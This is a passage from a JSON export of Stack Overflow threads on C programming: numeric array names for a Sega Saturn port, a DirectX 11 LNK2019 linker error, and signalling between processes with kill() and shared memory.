"link": "https://stackoverflow.com/users/5909831/mr-poe"}, "edited": false, "score": 0, "creation_date": 1482962352, "post_id": 41370087, "comment_id": 69942280, "body": "@Arkadiy I am developing a collision system for the Sega Saturn. I&#39;m using numbers for names because each number corresponds to something called a height mask, and giving each one a descriptive name would be nigh impossible, and ridiculously hard to manage. Using numbers means I can correlate the array name to what type of height mask it is."}, {"owner": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "reply_to_user": {"reputation": 34922, "user_id": 586873, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/11ba1f932f0af556969448ffba230d9a?s=128&d=identicon&r=PG", "display_name": "Grzegorz Szpetkowski", "link": "https://stackoverflow.com/users/586873/grzegorz-szpetkowski"}, "edited": false, "score": 0, "creation_date": 1482962520, "post_id": 41370087, "comment_id": 69942334, "body": "@GrzegorzSzpetkowski I fail to see how it would violate the DRY Principle. Can you please elaborate?"}, {"owner": {"reputation": 34922, "user_id": 586873, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/11ba1f932f0af556969448ffba230d9a?s=128&d=identicon&r=PG", "display_name": "Grzegorz Szpetkowski", "link": "https://stackoverflow.com/users/586873/grzegorz-szpetkowski"}, "edited": false, "score": 0, "creation_date": 1482962843, "post_id": 41370087, "comment_id": 69942443, "body": "@Mr.Potatobadger: Assuming that arrays are of the same type and with equal number of elements, the more pragmatic way would be to condense them into single data structure. This means, that you could also initialize them at once (for example, using the loop), instead of repeating the (same) initializer each time."}, {"owner": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "reply_to_user": {"reputation": 34922, "user_id": 586873, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/11ba1f932f0af556969448ffba230d9a?s=128&d=identicon&r=PG", "display_name": "Grzegorz Szpetkowski", "link": "https://stackoverflow.com/users/586873/grzegorz-szpetkowski"}, "edited": false, "score": 0, "creation_date": 1482963040, "post_id": 41370087, "comment_id": 69942509, "body": "@GrzegorzSzpetkowski I see... Can you tell me how that would be done?"}, {"owner": {"reputation": 34922, "user_id": 586873, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/11ba1f932f0af556969448ffba230d9a?s=128&d=identicon&r=PG", "display_name": "Grzegorz Szpetkowski", "link": "https://stackoverflow.com/users/586873/grzegorz-szpetkowski"}, "edited": false, "score": 0, "creation_date": 1482963326, "post_id": 41370087, "comment_id": 69942603, "body": "@Mr.Potatobadger: I believe that unwind&#39;s answer has already given the solution you might consider."}, {"owner": {"reputation": 28015, "user_id": 63550, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/RIZKi.png?s=128&g=1", "display_name": "Peter Mortensen", "link": "https://stackoverflow.com/users/63550/peter-mortensen"}, "edited": false, "score": 0, "creation_date": 1482968671, "post_id": 41370087, "comment_id": 69944283, "body": "You might consider using <a href=\"http://en.wikipedia.org/wiki/Forth_%28programming_language%29\" rel=\"nofollow noreferrer\">Forth</a> instead. It doesn&#39;t have many restrictions except space as a separator (though pure numbers are ... numbers)."}, {"owner": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "reply_to_user": {"reputation": 28015, "user_id": 63550, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/RIZKi.png?s=128&g=1", "display_name": "Peter Mortensen", "link": "https://stackoverflow.com/users/63550/peter-mortensen"}, "edited": false, "score": 0, "creation_date": 1482969128, "post_id": 41370087, "comment_id": 69944421, "body": "@Peter Mortensen As much as I&#39;d love to, I&#39;m programming on the Sega Saturn, a video game  console from 1994 with an architecture that&#39;s very difficult to understand. C is quite literally my only option besides ASM, and would make things exponentially more difficult, as the Saturn has more than 4 different processors."}, {"owner": {"user_type": "does_not_exist", "display_name": "user3458"}, "edited": false, "score": 5, "creation_date": 1483020162, "post_id": 41370087, "comment_id": 69964337, "body": "How does your code decide to use <code>_300[]</code> array vs. <code>_099[]</code> array? If there is a switch or an if based on a number, then the array of pointers or two-dimensional array is what you need."}, {"owner": {"reputation": 152277, "user_id": 438992, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/QouOz.jpg?s=128&g=1", "display_name": "Dave Newton", "link": "https://stackoverflow.com/users/438992/dave-newton"}, "edited": false, "score": 0, "creation_date": 1483034984, "post_id": 41370087, "comment_id": 69972199, "body": "@Mr.Potatobadger FWIW, it&#39;s easy to embed Forth-like languages into arbitrary platforms. We did this for a number of games back in Saturn and pre-Saturn days."}, {"owner": {"reputation": 4540, "user_id": 752842, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7a569b2ed8b021eb2815e8fbf5ebbc41?s=128&d=identicon&r=PG", "display_name": "Dzyann", "link": "https://stackoverflow.com/users/752842/dzyann"}, "edited": false, "score": 0, "creation_date": 1483126652, "post_id": 41370087, "comment_id": 70005777, "body": "From what you are saying you should do as some other people has suggested and just have a multidimensional array or a structure called <code>heightMasks</code>, that would be the most organized, because you would have all the related <code>heightMask</code> in one place, it will be easier to maintain and understand. Having 300 arrays is not maintainable. Also names should be descriptive, _001, doesn&#39;t mean anything, even heighMask1 is better. If this is a project only for yourself, that&#39;s &quot;ok&quot;, but think if someone else in the future is to read it, what is the best strategy for readability?"}], "answers": [{"comments": [{"owner": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "edited": false, "score": 2, "creation_date": 1482961539, "post_id": 41370115, "comment_id": 69941948, "body": "The underscore is very clean! Defenitely prefered over slapping a letter before it, thanks so much for letting me know you can do that."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "edited": false, "score": 11, "creation_date": 1482961635, "post_id": 41370115, "comment_id": 69941998, "body": "@Mr.Potatobadger better to use a letter. Just as clean and no probs with any reserved use of leading <code>_underscore</code>."}, {"owner": {"reputation": 875, "user_id": 5883707, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NQ0xM.png?s=128&g=1", "display_name": "Edwin Finch", "link": "https://stackoverflow.com/users/5883707/edwin-finch"}, "reply_to_user": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "edited": false, "score": 0, "creation_date": 1482961724, "post_id": 41370115, "comment_id": 69942048, "body": "@Mr.Potatobadger no problem! Please mark the answer as correct if it helped you :)"}, {"owner": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "edited": false, "score": 0, "creation_date": 1482961754, "post_id": 41370115, "comment_id": 69942063, "body": "Also, do you know why stackoverflow won&#39;t let me edit my comments? I made 2 typos in my response to you."}, {"owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 7, "creation_date": 1483014101, "post_id": 41370115, "comment_id": 69961012, "body": "Editing comments has nothing to do with reputation. Everyone is allowed to edit their comments for 5 minutes, then that&#39;s it. They are cast in stone (until you delete them, of course!)"}], "tags": [], "owner": {"reputation": 875, "user_id": 5883707, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NQ0xM.png?s=128&g=1", "display_name": "Edwin Finch", "link": "https://stackoverflow.com/users/5883707/edwin-finch"}, "is_accepted": true, "score": 31, "last_activity_date": 1483032914, "last_edit_date": 1483032914, "creation_date": 1482961304, "answer_id": 41370115, "question_id": 41370087, "link": "https://stackoverflow.com/questions/41370087/is-it-possible-to-use-integers-as-names-for-arrays/41370115#41370115", "title": "Is it possible to use integers as names for arrays?", "body": "<p>It's not possible to do this, no.</p>\n\n<p>However, you can begin the variable name with any valid character (such as a letter or underscore) and then make the rest numbers.</p>\n\n<p>For example, instead of <code>int 001[4]</code> you could do <code>int _001[4]</code>.</p>\n\n<p>For people just reading my answer - shoutout to unwind who answered below on how this is not great design for human reading or usability. See and upvote his answer too for more details.</p>\n"}, {"comments": [{"owner": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "edited": false, "score": 0, "creation_date": 1482963912, "post_id": 41370307, "comment_id": 69942805, "body": "I suppose I could do this. Is there a speed benefit of any kind? Or is it simply for organization? Later down the line, I&#39;m going to have an array of 256 that points to different combinations of the numbered arrays, and I feel like it&#39;d be easier just to type _025 instead of whatever[25]."}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "reply_to_user": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "edited": false, "score": 16, "creation_date": 1483019045, "post_id": 41370307, "comment_id": 69963698, "body": "There is probably no speed benefit, but most likely no penalty either. And it&#39;s really <i>much cleaner</i>. Any time where you&#39;re having lots of similar things that belong together, you should use an array. I&#39;m sorry but I don&#39;t understand your example. If you have a secondary array that indexes into the first, that works equally well with all 300 arrays together, of course."}, {"owner": {"reputation": 3771, "user_id": 5386374, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/fGuXb.png?s=128&g=1", "display_name": "Justin Time - Reinstate Monica", "link": "https://stackoverflow.com/users/5386374/justin-time-reinstate-monica"}, "reply_to_user": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "edited": false, "score": 0, "creation_date": 1483121509, "post_id": 41370307, "comment_id": 70003511, "body": "@Mr.Potatobadger You could just <a href=\"http://ideone.com/wCYTR3\" rel=\"nofollow noreferrer\">use an array named <code>_</code></a>, or any short, but valid name.  [Note that I&#39;m not 100% certain about C&#39;s rules for file scope identifiers that start with <code>_</code>, and that name <i>might</i> be invalid according to the standard.]"}], "tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": false, "score": 72, "last_activity_date": 1575484123, "last_edit_date": 1575484123, "creation_date": 1482962424, "answer_id": 41370307, "question_id": 41370087, "link": "https://stackoverflow.com/questions/41370087/is-it-possible-to-use-integers-as-names-for-arrays/41370307#41370307", "title": "Is it possible to use integers as names for arrays?", "body": "<p>This is very strange design.</p>\n\n<p>A number is really not a name, in the human sense. Nobody reading the code will understand the meaning of an array called <code>_031</code>.</p>\n\n<p>You should figure out what all of these arrays have in common, and use a single multi-dimensional array with a descriptive name.</p>\n\n<p>So instead of </p>\n\n<pre><code>int _001[4];\nint _002[4];\n...\nint _300[4];\n</code></pre>\n\n<p>you should have something like</p>\n\n<pre><code>int whatever[300][4];\n</code></pre>\n\n<p>Then wherever you used to access <code>_002</code>, you'd just access <code>whatever[1]</code> instead. Much cleaner. If you want to you can add one and make it <code>301</code> and use 1-based indexes.</p>\n"}, {"comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1483296978, "post_id": 41410509, "comment_id": 70040995, "body": "The suffixes are not really a problem. The initial-0, for example, makes the compiler look for an octal number: <code>0123</code>, and it will reject <code>0128</code>. But consider the very simple case <code>int 1 = 2; int x = 1;</code>. What value is in <code>x</code>?"}], "tags": [], "owner": {"reputation": 2529, "user_id": 3289081, "user_type": "registered", "accept_rate": 40, "profile_image": "https://graph.facebook.com/100000542516097/picture?type=large", "display_name": "Steve Fan", "link": "https://stackoverflow.com/users/3289081/steve-fan"}, "is_accepted": false, "score": 0, "last_activity_date": 1483206431, "last_edit_date": 1483206431, "creation_date": 1483206058, "answer_id": 41410509, "question_id": 41370087, "link": "https://stackoverflow.com/questions/41370087/is-it-possible-to-use-integers-as-names-for-arrays/41410509#41410509", "title": "Is it possible to use integers as names for arrays?", "body": "<p>No, and never.</p>\n\n<p>Remember kids, the regex for identifiers (C-wise) is <code>[_a-zA-Z][0-9a-zA-Z]*</code>, and the regex for decimal numbers (C-wise) is <code>[0-9]*</code>! Your compiler can literally see <code>000</code> (etc.) as a decimal number and instead 'wrongfully' take it as an expression which will then create a massive compiler catastrophe!</p>\n\n<p>EDIT: <strong>Why C disallow number prefixed identifier?</strong></p>\n\n<p>There's one important concept that C allowed <strong>suffix</strong>.</p>\n\n<p>For example, consider this pseudo-code:\n<code>\nint 01234;\nint 01234l;\n</code></p>\n\n<p>If we modified the regex of identifiers to <code>[_0-9a-zA-Z]*</code>, not only that it will overlap the range of decimal numbers, it may also overlap the range of special suffix like <code>l</code>, <code>ul</code>, <code>f</code> or <code>d</code> too. We humans can sure read and group those thing, but computers can't! Computers cannot solve ambiguity or otherwise it will an eternal death!</p>\n"}], "owner": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 932, "favorite_count": 0, "accepted_answer_id": 41370115, "answer_count": 3, "score": -5, "last_activity_date": 1575484123, "creation_date": 1482961134, "last_edit_date": 1483014232, "question_id": 41370087, "link": "https://stackoverflow.com/questions/41370087/is-it-possible-to-use-integers-as-names-for-arrays", "title": "Is it possible to use integers as names for arrays?", "body": "<p>I'm porting a game from the Sega Genesis to the Sega Saturn, and limited to C. I'm also following how the game is coded in Motorola 68000 assembly code as closely as possible, which requires many, many arrays of identical structures. I'm talking upwards of 300 or more. For the sake of organization and readability, it would be easier to name them with numbers instead of a string of characters</p>\n\n<p>For example, I would <em>prefer</em>:</p>\n\n<pre><code>int 000[4] = {1, 2, 3, 4};\nint 001[4] = {1, 2, 3, 4};\n</code></pre>\n\n<p>As opposed to:</p>\n\n<pre><code>int zerozerozero[4] = {1, 2, 3, 4};\nint zerozeroone[4]  = {1, 2, 3, 4};\n</code></pre>\n\n<p>But my compiler won't compile unless the array name starts with a character. Is there a way to do this? I suppose I could just throw an <code>a</code> at the front of the arrays, but I'd like to avoid that if possible.</p>\n"}, {"tags": ["c++", "c", "directx", "directx-11", "lnk2019"], "comments": [{"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 0, "creation_date": 1482962555, "post_id": 41370076, "comment_id": 69942350, "body": "You&#39;re missing the library that contains the <code>vsnprintf</code> function - I can&#39;t tell you which one it is, but that&#39;s the problem."}, {"owner": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 0, "creation_date": 1482964600, "post_id": 41370076, "comment_id": 69943042, "body": "So many similar:  <a href=\"http://stackoverflow.com/questions/15819095/unresolved-external-symbol-how-to-fix\">Unresolved Error How to fix</a>, <a href=\"http://stackoverflow.com/questions/19886397/how-to-solve-the-error-lnk2019-unresolved-external-symbol-function\">How to Solve the error LNK2019</a>, and <a href=\"http://stackoverflow.com/questions/12573816/what-is-an-undefined-reference-unresolved-external-symbol-error-and-how-do-i-fix\">What is an unresolved symbol and how to fix it</a>"}], "owner": {"reputation": 9, "user_id": 3557195, "user_type": "registered", "profile_image": "https://graph.facebook.com/100001601385757/picture?type=large", "display_name": "Dog-Face", "link": "https://stackoverflow.com/users/3557195/dog-face"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 29, "favorite_count": 0, "closed_date": 1482967869, "answer_count": 0, "score": 0, "last_activity_date": 1482961056, "creation_date": 1482961056, "question_id": 41370076, "link": "https://stackoverflow.com/questions/41370076/error-lnk2019-with-creating-directx11", "closed_reason": "Duplicate", "title": "Error LNK2019 with creating DirectX11", "body": "<p>Hi I'm currently trying to set up Direct X project in visual studio 2015.</p>\n\n<p>i have downloaded the correct SDK and linked the project to the correct directories, from what i have been taught at uni. (this entire project was just meant to be a simple copy the code across from a word document provided)</p>\n\n<p>I found that this is the only line of code that results in error.</p>\n\n<pre><code>if (FAILED(InitialiseWindow(hInstance, nCmdShow)))\n{\n    DXTRACE_MSG(\"Failed to create Window\");\n    return 0;\n}\n</code></pre>\n\n<p>if i comment out the DXTRACE_MSG then the program complies correctly.</p>\n\n<p>The exact error is LNK2019  unresolved external symbol __vsnprintf referenced in function \"long __stdcall StringVPrintfWorkerA(char *,unsigned int,unsigned int *,char const *,char *)\" (?StringVPrintfWorkerA@@YGJPADIPAIPBD0@Z)   Tutorial 01 Exercise 01 C:\\Users\\Tony\\Desktop\\AGP\\Tutorial 1 Exercise 01\\dxerr.lib(dxerra.obj).</p>\n\n<p>So overall i just need help in understanding the error, why it occurs and what i can do to rectify it so i can continue moving along with what i need for my assignment.</p>\n\n<p>any help is greatly appreciated.</p>\n\n<pre><code>#include &lt;windows.h&gt;\n#include &lt;D3D11.h&gt;\n#include &lt;d3d11.h&gt;\n#include &lt;D3DX11.h&gt;\n#include &lt;d3dx11.h&gt;\n#include &lt;DxErr.h&gt;\n\n//int (WINAPIV * __vsprintf)(char*, size_t, const char*, va_list) = __vsprintf;\n\n\n// Global Variables\n\nHINSTANCE g_hInst = NULL;\nHWND g_hWnd = NULL;\n\n// Rename for each tutorial\nchar g_TutorialName[100] = \"Tutorial 01 Exercise 01\\0\";\n\n\n// Forward declarations\n\n\nHRESULT InitialiseWindow(HINSTANCE hInstance, int nCmdShow);\nLRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);\n\n\n// Entry point to the program. Initializes everything and goes into a message processing\n// loop. Idle time is used to render the scene.\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmdLine, int nCmdShow)\n{\n\n\n    UNREFERENCED_PARAMETER(hPrevInstance);\n    UNREFERENCED_PARAMETER(lpCmdLine);\n\n    if (FAILED(InitialiseWindow(hInstance, nCmdShow)))\n    {\n        DXTRACE_MSG(\"Failed to create Window\");\n        return 0;\n    }\n    // Main message loop\n    MSG msg = { 0 };\n    while (msg.message != WM_QUIT)\n    {\n        if (PeekMessage(&amp;msg, NULL, 0, 0, PM_REMOVE))\n        {\n            TranslateMessage(&amp;msg);\n            DispatchMessage(&amp;msg);\n        }\n        else\n        {\n            //do somthing\n        }\n    }\n\n     return (int)msg.wParam;\n\n}\n\n// Register class and create window\n\nHRESULT InitialiseWindow(HINSTANCE hInstance, int nCmdShow)\n{\n     // Give your app window your own name\n     char Name[100] = \"Hello World\\0\";\n\n     // Register class\n      WNDCLASSEX wcex = { 0 };\n     wcex.cbSize = sizeof(WNDCLASSEX);\n    wcex.style = CS_HREDRAW | CS_VREDRAW;\n    wcex.lpfnWndProc = WndProc;\n    wcex.hInstance = hInstance;\n    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);\n    // wcex.hbrBackground = (HBRUSH )( COLOR_WINDOW + 1); // Needed for non-D3D apps\n\n    wcex.lpszClassName = Name;\n\n\n    if (!RegisterClassEx(&amp;wcex)) return E_FAIL;\n\n    // Create window\n    g_hInst = hInstance;\n    RECT rc = { 0, 0, 640, 480 };\n    AdjustWindowRect(&amp;rc, WS_OVERLAPPEDWINDOW, FALSE);\n\n    g_hWnd = CreateWindow(Name, g_TutorialName, WS_OVERLAPPEDWINDOW,\n        CW_USEDEFAULT, CW_USEDEFAULT, rc.right - rc.left,\n        rc.bottom - rc.top, NULL, NULL, hInstance, NULL);\n    if (!g_hWnd)\n        return E_FAIL;\n\n    ShowWindow(g_hWnd, nCmdShow);\n    return S_OK;\n}\n\n\n// Called every time the application receives a message\n\nLRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n     PAINTSTRUCT ps;\n     HDC hdc;\n    switch (message)\n        {\n    case WM_PAINT:\n        hdc = BeginPaint(hWnd, &amp;ps);\n        EndPaint(hWnd, &amp;ps);\n        break;\n\n    case WM_DESTROY:\n        PostQuitMessage(0);\n        break;\n\n    case WM_KEYDOWN:\n         if (wParam == VK_ESCAPE)\n             DestroyWindow(g_hWnd);\n        return 0;\n\n    default:\n    return DefWindowProc(hWnd, message, wParam, lParam);\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1482960981, "post_id": 41369927, "comment_id": 69941706, "body": "You didn&#39;t actually ask a question. &quot;I&#39;m having some truble&quot; is neither a question nor even a good description of what your specific problem is. Please review: <a href=\"http://stackoverflow.com/help/how-to-ask\">How do I ask a good question?</a>"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1482962561, "post_id": 41369927, "comment_id": 69942351, "body": "<code>process_1</code> does not wait for <code>process_2</code>. It just exits immediately. At which point <code>process_2</code> may not even have started. So when <code>process_2</code> sends the signal, <code>process_1</code> is likely to not exist anymore."}, {"owner": {"reputation": 161, "user_id": 7337678, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8511ae532a213ac7681e74f6410634dc?s=128&d=identicon&r=PG&f=1", "display_name": "Leo", "link": "https://stackoverflow.com/users/7337678/leo"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1482964081, "post_id": 41369927, "comment_id": 69942859, "body": "Oh ok. Got it. Thank you"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1482970345, "post_id": 41369927, "comment_id": 69944780, "body": "<code>if(signo=SIGUSR1){</code> --&gt;&gt; <code>if(signo == SIGUSR1){</code> Plus: you should not use printf() in a signal handler."}], "answers": [{"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 0, "last_activity_date": 1548927978, "creation_date": 1548927978, "answer_id": 54457641, "question_id": 41369927, "link": "https://stackoverflow.com/questions/41369927/kill-function-between-two-processes/54457641#54457641", "title": "Kill() function between two processes", "body": "<p><code>process_1</code> does not wait for <code>process_2</code>. It just exits immediately. At which point <code>process_2</code> may not even have started. So when <code>process_2</code> sends the signal, <code>process_1</code> is likely to not exist anymore.\n                    &ndash;&nbsp;kaylum</p>\n"}], "owner": {"reputation": 161, "user_id": 7337678, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8511ae532a213ac7681e74f6410634dc?s=128&d=identicon&r=PG&f=1", "display_name": "Leo", "link": "https://stackoverflow.com/users/7337678/leo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 121, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1548927978, "creation_date": 1482960299, "last_edit_date": 1482961580, "question_id": 41369927, "link": "https://stackoverflow.com/questions/41369927/kill-function-between-two-processes", "title": "Kill() function between two processes", "body": "<p>Can I use the kill() function to send a signal to another process? It should be possible, but kill() fails and I can't understand why. \nI have two programs (process_1 and process_2). The first one should set a signal handler to increase a variable, than create a child that uses execve and loads process_2. The other program should send the signal using kill(). I used the shared memory to share process_1's pid through a struct (because I have other variables to share). The code of the first program is as follows:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;time.h&gt;\n#include &lt;sys/ipc.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/shm.h&gt;\n#include &lt;sys/wait.h&gt;\n\n#define KEY_SM 1234\nstatic int value_to_change=0;\n\n\ntypedef struct keys{\n    pid_t pid_process;\n}keynote;\n\n\nstatic void test_handler(int signo){\n    if(signo=SIGUSR1){\n        printf(\"received SIGUSR1\\n\");\n        value_to_change++;\n    }\n}\n\n\nint main(){\n    if((signal(SIGUSR1, test_handler))==SIG_ERR) perror(\"Errore allocazione SIGUSR1\");\n    int flags = S_IRUSR|S_IWUSR|IPC_CREAT;\n    size_t shm_size = sizeof(keynote);\n    int shm_id = shmget(KEY_MC, shm_size, flags);\n    keynote *chv = shmat(shm_id, NULL, 0);\n    chv-&gt;pid_process=getpid();\n    printf(\"%d\\n\",chv-&gt;pid_process);\n\n\n    int process_2;\n    process_2=fork();\n    if(process_2==0){\n        char* argv[]={\"process_1\", \"process_2\", NULL};\n        if((execve(\"process_2\", argv, NULL))&lt;0) perror(\"execve error\");\n    exit(0);\n    }else if(process_2&lt;0)perror(\"fork error\");\n\n    return 0;\n}\n</code></pre>\n\n<p>The second program code is:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;time.h&gt;\n#include &lt;sys/ipc.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/shm.h&gt;\n#include &lt;sys/wait.h&gt;\n\n #define KEY_SM 1234\n\n    typedef struct keys{\n        pid_t pid_process;\n    }keynote;\n\n\nstatic void signal_to_send(pid_t process){\n    int ret=kill(process, SIGUSR1);\n    printf(\"%d\", ret);\n    }\n}\n\n\nint main(int argc, char **argv){\n    int pid_of_process_1;\n    int flags = S_IRUSR|S_IWUSR|IPC_CREAT;\n    size_t shm_size = sizeof(keynote);\n\n    int shm_id = shmget(KEY_MC, shm_size, flags);  \n    keynote *chv = shmat(shm_id, NULL, 0);\n    signal_to_send(chv-&gt;pid_process);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "bit-manipulation", "bits"], "comments": [{"owner": {"reputation": 33821, "user_id": 45685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/y4RJr.jpg?s=128&g=1", "display_name": "AndersK", "link": "https://stackoverflow.com/users/45685/andersk"}, "edited": false, "score": 4, "creation_date": 1482958154, "post_id": 41369478, "comment_id": 69940572, "body": "i think your question would be better suited for codereview <a href=\"http://codereview.stackexchange.com/\">codereview.stackexchange.com</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482958774, "post_id": 41369478, "comment_id": 69940845, "body": "Mountain out of a molehill. The code seems obfuscated. It would be clear to add two digits (sources and result adjusted for character value) and pass a <code>carry</code> to the next digit left. 